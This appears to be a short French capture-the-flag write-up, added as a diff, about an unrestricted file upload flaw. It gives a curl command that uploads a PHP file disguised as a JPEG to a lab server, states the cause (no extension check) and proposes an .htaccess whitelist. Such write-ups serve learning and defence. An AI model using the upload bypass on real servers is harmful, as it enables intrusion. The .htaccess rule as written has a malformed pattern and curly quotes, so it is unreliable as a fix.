@@ -1,0 +1,18 @@
+Faille:
+
+touch i.php && curl -v -F "Upload=send" -H 'Content-Type: multipart/form-data' -F "uploaded=@i.php;type=image/jpeg" 'http://10.11.200.17/?page=upload' | grep flag
+
+Raison de la faille:
+
+Le serveur n'a pas l'air de controler l'extension du fichier.
+
+Comment se proteger de la faille:
+
+Créer un fichier .htaccess dans le répertoire parent des uploads de fichiers, spécifiant la liste des extensions autorisées. Exemple de directives, à adapter en fonction de votre contexte :
+
+deny from all
+
+<Files ~ “^w+.(gif|jpe?g|png|pdf)$”>
+order deny,allow
+allow from all
+</Files>
